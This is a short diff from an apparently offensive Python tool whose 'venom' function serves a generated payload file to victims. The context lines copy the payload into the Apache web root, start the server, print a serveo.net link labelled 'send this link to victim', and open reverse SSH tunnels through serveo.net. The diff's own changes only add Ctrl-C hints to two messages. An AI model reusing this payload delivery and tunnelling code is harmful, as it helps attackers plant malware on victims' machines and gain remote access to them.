@@ -117,13 +117,13 @@ def venom():
 			                print(f"using DEFAULT url > https://febrev.serveo.net/{name} <<send this link to victim")
 			                os.system(f"cp {output}/{name} /var/www/html/")
 			                os.system("service apache2 start") 
-			                print("SERVER AND PORT FORWARDING ENABLED.....")
+			                print("SERVER AND PORT FORWARDING ENABLED.....  Ctrl-C to stop & close")
 			                os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
 			                os.system(f"rm -rf /var/www/html/{name}") 
 			                exit()
 	        else:
 		           print("PORT FORWARDING ENABLED>>>>>>>>>>")
-		           print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING")
+		           print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING , Ctrl-c to stop & close")
 		           os.system(f"ssh -R {port}:{ip}:{port} serveo.net")
 		           exit()
     
